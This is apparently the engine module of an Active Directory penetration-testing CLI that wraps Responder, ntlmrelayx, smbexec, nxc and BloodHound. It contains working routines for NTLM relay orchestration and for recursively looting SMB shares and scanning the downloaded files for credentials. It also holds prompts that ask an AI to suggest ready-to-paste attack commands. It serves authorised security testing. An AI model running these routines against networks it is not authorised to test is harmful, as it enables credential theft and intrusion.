from datetime import datetime
import re
import subprocess

from queue import Queue
from pathlib import Path
from typing import List, Tuple


import typer
from domainscriptor.Runner import Runner
from domainscriptor.automations import *
from domainscriptor.ai_client import get_ai_client
from domainscriptor.adapters_registry.adapters.bloodhound import BloodhoundAdapter
from domainscriptor.adapters_registry.adapters.ntlmrelayx import NTLMRelayAdapter
from domainscriptor.adapters_registry.adapters.nmap import NmapAdapter
from domainscriptor.adapters_registry.adapters.nslookup import NslookupAdapter
from domainscriptor.adapters_registry.adapters.nxc import NXCAdapter
from domainscriptor.adapters_registry.adapters.proxychains import ProxychainsAdapter
from domainscriptor.adapters_registry.adapters.responder import ResponderAdapter
from domainscriptor.adapters_registry.adapters.smbexec import SMBExecAdapter
from domainscriptor.adapters_registry.adapters.smbclient import SMBClientAdapter
from domainscriptor.adapters_registry.abstract_adapter import Adapter
from domainscriptor.adapters_registry.registry import Adapter_Registry
from domainscriptor.data.canonical_db import CanonicalDataModel, SettingsDataModel
from domainscriptor.data.db_reader import DBReader
from domainscriptor.data.db_writer import DBWriter
from domainscriptor.smb_loot import is_interesting, extract_text, search_credentials


def _return_file_content(name, max_lines=15):
    preview = []

    with open(name, "r", encoding="utf-8") as f:
        for i, line in enumerate(f):
            if i < max_lines:
                preview.append(line)
            else:
                preview.append("\n... file continuous ...\n")
                break

    return "".join(preview)


def _pretty_format_settings(settings: List[Tuple[str, SettingsDataModel]]):
    if not settings:
        return "No entries found."

    headers = ["ID", "Domain", "User", "PW", "Default"]
    rows = []
    for setting_id, setting in settings:
        rows.append([
            str(setting_id),
            setting.domain,
            setting.username,
            setting.password,
            "*" if setting.is_default else ""
        ])

    col_widths = []
    for col in range(len(headers)):
        max_width = max(
            len(headers[col]),
            max(len(row[col]) for row in rows)
        )
        col_widths.append(max_width)

    header_line = " | ".join(
        headers[i].ljust(col_widths[i]) for i in range(len(headers))
    )

    separator = "-+-".join(
        "-" * col_widths[i] for i in range(len(headers))
    )

    row_lines = []
    for row in rows:
        line = " | ".join(
            row[i].ljust(col_widths[i]) for i in range(len(headers))
        )
        row_lines.append(line)

    table = "\n".join([header_line, separator] + row_lines)

    return table


def _format_share_diff(per_user: dict) -> str:
    if not per_user:
        return "No data collected."

    users = list(per_user.keys())
    all_shares = sorted({share for shares in per_user.values() for share in shares})

    if not all_shares:
        return "No shares discovered for any user."

    header = ["SHARE"] + users
    col_widths = [max(len(header[i]), 12) for i in range(len(header))]

    def fmt_row(row):
        return " | ".join(cell.ljust(col_widths[i]) for i, cell in enumerate(row))

    lines = [fmt_row(header), "-+-".join("-" * w for w in col_widths)]

    for share in all_shares:
        row = [share]
        for u in users:
            info = per_user[u].get(share)
            if info is None:
                row.append("-")
            elif info["access"] == "OK":
                row.append(f"OK ({len(info['files'])})")
            else:
                row.append(info["access"])
        lines.append(fmt_row(row))

    diff_lines = ["", "File visibility differences per share:"]
    found_diff = False
    for share in all_shares:
        visible_users = [u for u in users if per_user[u].get(share, {}).get("access") == "OK"]
        if len(visible_users) < 2:
            continue
        file_sets = {u: per_user[u][share]["files"] for u in visible_users}
        union = set().union(*file_sets.values())
        if all(file_sets[u] == union for u in visible_users):
            continue
        found_diff = True
        diff_lines.append(f"  [{share}]")
        for u in visible_users:
            others = set().union(*(s for other, s in file_sets.items() if other != u))
            only_here = file_sets[u] - others
            if only_here:
                diff_lines.append(f"    only visible to {u}: {sorted(only_here)}")

    if not found_diff:
        diff_lines.append("  (no differences in visible files across users with access)")

    return "\n".join(lines + diff_lines)


class Engine:
    def __init__(self, argument_handler):
        self.argument_handler = argument_handler
        self.adapter_registry: Adapter_Registry = Adapter_Registry()
        self.runner = Runner()
        self.queue = None
        self.db_writer: DBWriter = None
        self.db_reader: DBReader = None
        self.load_adapters()

    def load_adapters(self):
        self.adapter_registry.register(ResponderAdapter)
        self.adapter_registry.register(SMBExecAdapter)
        self.adapter_registry.register(SMBClientAdapter)
        self.adapter_registry.register(NTLMRelayAdapter)
        self.adapter_registry.register(NXCAdapter)
        self.adapter_registry.register(ProxychainsAdapter)
        self.adapter_registry.register(NmapAdapter)
        self.adapter_registry.register(NslookupAdapter)
        self.adapter_registry.register(BloodhoundAdapter)

    def init_database_connection(self, db_dir: str = "."):
        self.queue = Queue()
        db_dir = Path(db_dir)
        db_dir.mkdir(parents=True, exist_ok=True)

        db_files = list(db_dir.glob("*.db"))
        db_path = self._choose_database(db_files, db_dir)
        new_db = not db_path.exists()
        db_writer = DBWriter(db_path, self.queue)
        if new_db:
            settings = None
            if typer.confirm("Do you want to set initial settings?"):
                settings = self._init_setting()
            self.set_target()
            db_writer.init_database(settings)
        else:
            db_writer.migrate_database()

        db_writer.start()
        self.db_writer = db_writer
        self.db_reader = DBReader(db_path)

    def create_adapter(self, name: str, **cfg) -> Adapter:
        return self.adapter_registry.create(name, **cfg)

    def show_adapters(self):
        return self.adapter_registry.list_names()

    def get_help_List(self):
        adapters = self.adapter_registry._adapters

        helps = {}
        for key, value in adapters.items():
            helps[key] = value.help_List

        return helps

    def show_adapter_help(self, adapter_name: str):
        kwargs = {}
        adapter = self.create_adapter(adapter_name, **kwargs)
        return adapter.help()

    def show_adapter_version(self, adapter_name: str):
        kwargs = {}
        adapter = self.create_adapter(adapter_name, **kwargs)
        return adapter.version()

    def show_processes(self):
        return self.runner.show_processes()

    def stop_process(self, name: str):
        return self.runner.stop_tool(name)

    def exit(self):
        self.runner.stop_all()
        self.queue.join()
        self.db_writer.stop()
        self.db_writer.join()

    def write_data(self, data):
        self.db_writer.submit_canonical_data(data)

    def read_data(self):
        return self.db_reader.fetch_all()

    def read_data_ip(self, ip):
        return self.db_reader.get_by_ip(ip)

    def read_data_protocol(self, protocol):
        return self.db_reader.get_by_protocol(protocol)

    def read_data_tool(self, tool):
        return self.db_reader.get_by_tool(tool)

    def search_data(self, search):
        return self.db_reader.search_in_data(search)

    def get_settings(self):
        return _pretty_format_settings(self.db_reader.fetch_settings())

    def get_settings_by_id(self, id):
        return _pretty_format_settings(self.db_reader.get_settings_by_id(id))

    def add_settings(self):
        settings = self._init_setting()
        self.db_writer.submit_setting(settings)

    def delete_setting(self, setting_id: str):
        self.db_writer.delete_setting(setting_id)

    def set_default_setting(self, setting_id: str):
        self.db_writer.set_default_setting(setting_id)

    def get_default_Credentials(self):
        setting_list = self.db_reader.fetch_settings()
        if not setting_list:
            return None
        for _, settings in setting_list:
            if settings.is_default:
                return settings
        # Kein Default gesetzt -> Fallback auf den ersten Eintrag
        return setting_list[0][1]

    def run_task(self, adapter_name: str, return_output=False, **kwargs):
        try:
            adapter = self.create_adapter(adapter_name, **kwargs.pop("adapter_config", {}))
            #typer.echo(f"Logging Command: {kwargs}")
            default_settings = self.get_default_Credentials()
            # typer.echo(f"Default Settings {default_settings}")
            data = adapter.run(self.runner, self.queue, auth=default_settings, **kwargs)
            if data:
                # typer.echo(f"Logging normalized Data: {data}")
                self.write_data(data)
                if return_output:
                    return data
        except RuntimeError as e:
            typer.echo(typer.style(str(e), fg=typer.colors.RED, bold=True))
        except TypeError as e:
            typer.echo(typer.style(str(e), fg=typer.colors.RED, bold=True))

    def get_dcs(self):
        ips = []

        if self._check_adapter_exists("nxc") and self.get_default_Credentials():
            ip = typer.prompt("Enter IP for DC check")
            result = self.run_task("nxc", return_output=True,
                                   **{'protocol': 'ldap', 'target': ip, 'extra_args': '--dc-list'})
            result = result[0]
            for entry in result.data:
                for found_ip in re.findall(r"(?:\d{1,3}\.){3}\d{1,3}", entry["message"]):
                    if found_ip not in ips:
                        ips.append(found_ip)

        elif self._check_adapter_exists("nslookup"):
            domain = typer.prompt("Enter domain for DC lookup (e.g. corp.local)")
            result = self.run_task("nslookup", return_output=True, **{'domain': domain})
            if result:
                for entry in result:
                    for item in entry.data:
                        candidate = item.get("ip") or item.get("hostname", "")
                        if candidate and candidate not in ips:
                            ips.append(candidate)

        else:
            typer.echo("Neither nxc (with credentials) nor nslookup is available.")
            return

        typer.echo(f"Found DCs: {ips}")
        with open("dc_ips.txt", "w", encoding="utf-8") as f:
            for found_ip in ips:
                f.write(found_ip + "\n")
        typer.echo("Saved to dc_ips.txt")

    def get_relayable(self):
        if self._check_adapter_exists("nxc"):
            self.run_task("nxc", **{'targets_file': 'targets.txt', 'extra_args': '--gen-relay-list smb_relayable.txt'})
            result = _return_file_content("smb_relayable.txt")
            return f"SMB-Relayable:\n{result}"

        return "Adapter does not exist"

    def get_targets(self):
        try:
            with open("targets.txt") as f:
                typer.echo(f"TARGETS:")
                for line in f:
                    typer.echo(line.strip())

        except FileNotFoundError:
            typer.echo(f"Targets file not found")

    def show_relayable(self):
        try:
            with open("smb_relayable.txt") as f:
                typer.echo(f"SMB Relayable Targets:")
                for line in f:
                    typer.echo(line.strip())

        except FileNotFoundError:
            typer.echo(f"Targets file not found")

    def _print_check_header(self, label: str, index: int, total: int, vuln: str, creds_required: bool):
        bar = "━" * 60
        creds_tag = typer.style("auth", fg=typer.colors.CYAN) if creds_required else typer.style("no auth", fg=typer.colors.MAGENTA)
        counter = typer.style(f"[{index}/{total}]", fg=typer.colors.WHITE, bold=True)
        protocol = typer.style(f"[{label}]", fg=typer.colors.YELLOW, bold=True)
        name = typer.style(vuln, fg=typer.colors.WHITE, bold=True)
        typer.echo(f"\n{bar}")
        typer.echo(f" {counter} {protocol} {name}  ({creds_tag})")
        typer.echo(bar)

    def _print_check_summary(self, label: str, ip: str, total: int):
        typer.echo("\n" + "━" * 60)
        typer.secho(f" {label} scan complete — {total} checks run against {ip}", fg=typer.colors.GREEN, bold=True)
        typer.echo("━" * 60 + "\n")

    def check_smb_security(self, ip=None, proxy=False):
        relay = None
        if proxy==True:
            relay = self._get_available_relays()
        if not self._check_adapter_exists("nxc"):
            return
        if not ip:
            ip = typer.prompt("Enter IP to check")

        commands = get_smb_security_commands()
        total = len(commands)
        for i, checks in enumerate(commands, start=1):
            self._print_check_header("SMB", i, total, checks["vuln"], checks["creds_required"])
            parameters = checks["parameters"].copy()
            parameters["target"] = ip
            if proxy and relay and checks["creds_required"]:
                parameters["proxy"] = str(proxy)
                domain, username = relay.user.split("/")
                parameters["domain"] = domain
                parameters["username"] = username
            elif not checks["creds_required"]:
                parameters["username"] = ""
                parameters["password"] = ""
            self.run_task("nxc", **parameters)

        self._print_check_summary("SMB", ip, total)

    def check_ldap_security(self, ip=None, proxy=False):
        relay = None
        if proxy:
            relay = self._get_available_relays()
        if not self._check_adapter_exists("nxc"):
            return
        if not ip:
            ip = typer.prompt("Enter IP to check")

        commands = get_ldap_security_commands()
        total = len(commands)
        for i, checks in enumerate(commands, start=1):
            self._print_check_header("LDAP", i, total, checks["vuln"], checks["creds_required"])
            parameters = checks["parameters"].copy()
            parameters["target"] = ip
            if proxy and relay and checks["creds_required"]:
                parameters["proxy"] = str(proxy)
                domain, username = relay.user.split("/")
                parameters["domain"] = domain
                parameters["username"] = username
            elif not checks["creds_required"]:
                parameters["username"] = ""
                parameters["password"] = ""
            self.run_task("nxc", **parameters)

        self._print_check_summary("LDAP", ip, total)

    def _smb_raw_run(self, cmd, timeout=20):
        try:
            return subprocess.run(
                cmd, stdout=subprocess.PIPE, stderr=subprocess.PIPE, timeout=timeout, text=True,
            )
        except (subprocess.TimeoutExpired, subprocess.SubprocessError, FileNotFoundError):
            return None

    def hunt_smb_credentials(self, target=None, shares=None, max_file_size=3_000_000):
        """
        Durchsucht SMB-Shares rekursiv nach interessanten Dateien (Konfigs, Skripte,
        Office-Dokumente, ...), lädt Treffer nach loot/<target>/<share>/... herunter
        und scannt deren Inhalt nach Zugangsdaten-Mustern.
        """
        if not self._check_adapter_exists("smbclient"):
            typer.echo("smbclient adapter not available")
            return

        if not target:
            target = typer.prompt("Enter target IP/hostname for SMB credential hunt")

        auth = self.get_default_Credentials()
        if not auth:
            typer.echo("No credentials configured. Use 'settings add' first.")
            return

        if not shares:
            list_adapter = self.create_adapter("smbclient")
            cmd = list_adapter.build_command(target=target, list_shares=True, auth=auth)
            result = self._smb_raw_run(cmd, timeout=30)
            share_entries = list_adapter.parse_share_entries(result.stdout) if result else []
            shares = [
                s.name for s in share_entries
                if s.share_type == "Disk"
                and s.name.upper() not in {"ADMIN$", "C$", "IPC$"}
                and not s.name.endswith("$")
            ]

        if not shares:
            typer.echo("No accessible (non-administrative) shares found.")
            return

        typer.echo(f"Scanning shares on {target}: {shares}")

        loot_root = Path("loot") / target
        findings = []
        scanned = 0
        downloaded = 0

        for share in shares:
            ls_adapter = self.create_adapter("smbclient")
            cmd = ls_adapter.build_command(target=target, share=share, recursive=True, command="ls", auth=auth)
            result = self._smb_raw_run(cmd, timeout=90)
            if not result:
                typer.echo(f"  [-] Could not list share {share}")
                continue

            for entry in ls_adapter.parse_entries(result.stdout):
                if entry.is_dir or entry.size > max_file_size:
                    continue
                scanned += 1
                if not is_interesting(entry.name, entry.extention):
                    continue

                local_path = loot_root / share / entry.name.replace("\\", "/")
                local_path.parent.mkdir(parents=True, exist_ok=True)

                get_adapter = self.create_adapter("smbclient")
                get_cmd = get_adapter.build_command(
                    target=target, share=share,
                    command=f'get "{entry.name}" "{local_path}"',
                    auth=auth,
                )
                get_result = self._smb_raw_run(get_cmd, timeout=60)
                if not get_result or not local_path.exists():
                    continue

                downloaded += 1
                matches = []
                text = extract_text(local_path, entry.extention)
                if text:
                    matches = search_credentials(text)

                findings.append({
                    "share": share,
                    "remote_path": entry.name,
                    "local_path": str(local_path),
                    "size": entry.size,
                    "matches": matches,
                })

        if findings:
            self.write_data(CanonicalDataModel(
                "SMB-LOOT", target, "smbloot", datetime.now().isoformat(), findings
            ))

        hits_findings = [f for f in findings if f["matches"]]
        summary = (
            f"Scanned {scanned} file(s), downloaded {downloaded} to {loot_root}, "
            f"{len(hits_findings)} file(s) with credential-like content."
        )
        if hits_findings:
            summary += "\n" + "\n".join(f"  - {f['local_path']}" for f in hits_findings)
        typer.echo(summary)
        return summary

    def diff_shares(self, target=None):
        """
        Vergleicht für alle hinterlegten User (settings), welche Shares sie sehen,
        ob sie darauf zugreifen dürfen und welche Dateien sie darin sehen - um schnell
        zu erkennen, ob ein (neuer) User andere Berechtigungen/Sichtbarkeiten hat.
        """
        if not self._check_adapter_exists("smbclient"):
            typer.echo("smbclient adapter not available")
            return

        if not target:
            target = typer.prompt("Enter target IP/hostname to compare share access for")

        settings_list = self.db_reader.fetch_settings()
        if len(settings_list) < 2:
            typer.echo("Need at least 2 saved users (see 'settings add') to compare access.")
            return

        per_user = {}
        for _, setting in settings_list:
            label = f"{setting.domain}\\{setting.username}" if setting.domain else setting.username

            list_adapter = self.create_adapter("smbclient")
            cmd = list_adapter.build_command(
                target=target, list_shares=True,
                username=setting.username, password=setting.password, domain=setting.domain,
            )
            result = self._smb_raw_run(cmd, timeout=30)
            share_entries = list_adapter.parse_share_entries(result.stdout) if result else []

            share_access = {}
            for s in share_entries:
                if s.share_type != "Disk":
                    continue

                ls_adapter = self.create_adapter("smbclient")
                ls_cmd = ls_adapter.build_command(
                    target=target, share=s.name, command="ls",
                    username=setting.username, password=setting.password, domain=setting.domain,
                )
                ls_result = self._smb_raw_run(ls_cmd, timeout=20)
                stdout = ls_result.stdout if ls_result else ""
                stderr = ls_result.stderr if ls_result else ""
                combined = (stdout + stderr).upper()
                denied = "ACCESS_DENIED" in combined or "NT_STATUS" in combined or "BAD_NETWORK_NAME" in combined

                entries = ls_adapter.parse_entries(stdout) if (ls_result and not denied) else []
                share_access[s.name] = {
                    "access": "DENIED" if denied else ("OK" if ls_result else "ERROR"),
                    "files": {e.name for e in entries},
                }

            per_user[label] = share_access

        report = _format_share_diff(per_user)

        serializable = [
            {
                "user": user,
                "shares": {
                    share: {"access": info["access"], "files": sorted(info["files"])}
                    for share, info in shares.items()
                },
            }
            for user, shares in per_user.items()
        ]
        self.write_data(CanonicalDataModel(
            "SMB-DIFF", target, "diff_shares", datetime.now().isoformat(), serializable
        ))

        return report

    def collect_bloodhound(self, domain=None, nameserver=None, collection_method="All",
                            zip=False, timeout=1800):
        """
        Sammelt AD-Daten (Computer, User, Gruppen, GPOs, ...) via BloodHound.py für
        die spätere Analyse in BloodHound.
        """
        if not self._check_adapter_exists("bloodhound"):
            typer.echo("bloodhound-python adapter not available")
            return

        if not self.get_default_Credentials():
            typer.echo("No credentials configured. Use 'settings add' first.")
            return

        if not domain:
            domain = typer.prompt("Enter AD domain (e.g. corp.local)")
        if not nameserver:
            nameserver = typer.prompt(
                "Enter DNS server / DC IP for collection (leave empty to use system DNS)",
                default="", show_default=False,
            ) or None

        typer.echo(f"Collecting AD data for domain {domain} (method={collection_method}) ...")
        result = self.run_task(
            "bloodhound", return_output=True,
            domain=domain, nameserver=nameserver, collection_method=collection_method,
            zip=zip, timeout=timeout,
        )
        if not result:
            typer.echo("No data collected.")
            return

        entry = result[0].data[0]
        collected = entry["collected"]
        if not collected:
            typer.echo(f"Collection finished, but no output files were found in {entry['output_dir']}.")
            return

        typer.echo(f"Collected data saved to {entry['output_dir']}:")
        for label, info in collected.items():
            typer.echo(f"  - {label}: {info['count']} ({info['file']})")
        return entry

    def _choose_database(self, db_files, db_dir):
        if db_files:
            typer.echo("Existing databases found:\n")
            for i, db in enumerate(db_files, start=1):
                typer.echo(f"{i}. {db.name}")

            typer.echo("0. Create new database")

            choice = typer.prompt("Select database", type=int)

            if choice == 0:
                return self._create_new_db_name(db_dir)
            elif 1 <= choice <= len(db_files):
                return db_files[choice - 1]
            else:
                typer.echo("Invalid choice. Creating new database.")
                return self._create_new_db_name(db_dir)
        else:
            typer.echo("No database found. Creating a new one.")
            return self._create_new_db_name(db_dir)

    def _create_new_db_name(self, db_dir):
        timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
        new_name = f"domainscriptor_{timestamp}.db"
        return db_dir / new_name

    def _init_setting(self):
        settings = []
        while True:
            typer.echo("The following settings can be set Domain, Username and Passwort")
            domain = typer.prompt("Domain")
            username = typer.prompt("Username")
            password = typer.prompt("Password")
            settings_data = SettingsDataModel(domain, username, password)
            settings.append(settings_data)

            if not typer.confirm("Do you want to add other user?"):
                break

        typer.echo(f"Settings created for {settings}")
        return settings

    def set_target(self):
        typer.echo("Set the target IP ranges Format X.X.X.X(/Y) (separate by ,)")
        targets = typer.prompt("Targets")
        targets = targets.split(",")
        with open("targets.txt", "w") as f:
            for target in targets:
                f.write(target.strip() + "\n")

    def _check_adapter_exists(self, adapter_name):
        return adapter_name in self.adapter_registry.list_names()

    # ── Web UI ────────────────────────────────────────────────────────────────

    def start_webui(self, host: str = "127.0.0.1", port: int = 5000) -> None:
        from domainscriptor.web import start_in_thread
        start_in_thread(self.db_reader, host=host, port=port)
        typer.secho(f"Web UI: http://{host}:{port}", fg=typer.colors.CYAN)

    # ── AI helpers ────────────────────────────────────────────────────────────

    def _build_ai_client(self):
        try:
            return get_ai_client()
        except EnvironmentError as e:
            raise RuntimeError(str(e))

    def ai_suggest(self) -> str:
        client = self._build_ai_client()
        adapters = ", ".join(self.adapter_registry.list_names())
        findings = self.db_reader.fetch_all()
        settings = self.get_default_Credentials()
        domain = settings.domain if settings else "unknown"

        system = (
            "You are an Active Directory penetration testing expert. "
            "The user is running Domainscriptor, a CLI framework that wraps AD pentesting tools. "
            "Based on the context below, suggest the 3-5 most valuable next steps as concrete Domainscriptor commands. "
            "Format each suggestion as a ready-to-paste command with a one-line explanation. "
            "Only use adapters that are listed as available. Be concise and actionable."
        )
        user = (
            f"Available adapters: {adapters}\n"
            f"Target domain: {domain}\n\n"
            f"Collected findings so far:\n{findings if findings else '(none yet)'}"
        )
        return client.chat(system, user)

    def ai_analyze(self) -> str:
        client = self._build_ai_client()
        findings = self.db_reader.fetch_all()
        if not findings or findings.strip() == "":
            return "No data in the database yet. Run some commands first (e.g. shortcuts smb_check)."

        system = (
            "You are a senior Active Directory security analyst. "
            "Analyze the penetration test findings below and identify: "
            "1) confirmed vulnerabilities or misconfigurations, "
            "2) potential attack paths (e.g. relay chains, privilege escalation), "
            "3) recommended remediation steps. "
            "Structure your response with clear headings. Be specific about IPs and protocols where relevant."
        )
        user = f"Pentest findings:\n\n{findings}"
        return client.chat(system, user)

    def _get_available_relays(self):
        relays = self.runner.get_relays()
        if relays:
            typer.echo(f"Found {len(relays)} relays")
            typer.echo(f"Relays: {relays}")
        if not typer.confirm("Do you want to use a relay?"):
            return None
        else:
            index = 1
            for relay in relays:
                typer.echo(f"ID: {index} IP: {relay.ip} User: {relay.user} Admin: {relay.admin_status} ")
                index += 1
            index = typer.prompt(f"Select relay", type=int)
            return relays[index-1]